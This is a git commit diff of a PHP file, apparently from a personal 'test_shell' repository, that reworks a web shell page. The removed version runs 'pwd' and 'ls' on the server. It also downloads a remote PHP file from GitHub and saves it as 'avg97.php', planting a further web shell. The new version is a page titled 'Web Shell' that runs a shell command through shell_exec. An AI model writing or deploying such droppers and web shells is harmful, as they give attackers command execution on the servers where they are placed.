bee38619befb34f0e8e5113dea3cef41d4d55333
Alexander Goryushkin <43167451+alexgoryushkin@users.noreply.github.com>
2020-05-03 19:52:04 +0500

    Update shell_exec.1.php

--- shell_exec.1.php
+++ shell_exec.1.php
@@ -1,10 +1,15 @@
-<?= 
-shell_exec('pwd') . 
-'<br>--------<br>' . 
-shell_exec('ls') . 
-'<br>--------<br>' . 
-file_put_contents("avg97.php", fopen("https://raw.githubusercontent.com/alexgoryushkin/test_shell/master/shell_exec..php", 'r')) . 
-'<br>--------<br>' . 
-shell_exec('ls')
+<html>
+	<head>
+		<meta charset="windows-1251">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
+		<title>Web Shell</title>
+	</head>
+	<body>
+		<?php 
+			echo shell_exec('ping 8.8.8.8');
+		?>
+	</body>
+</html>
 
-?>
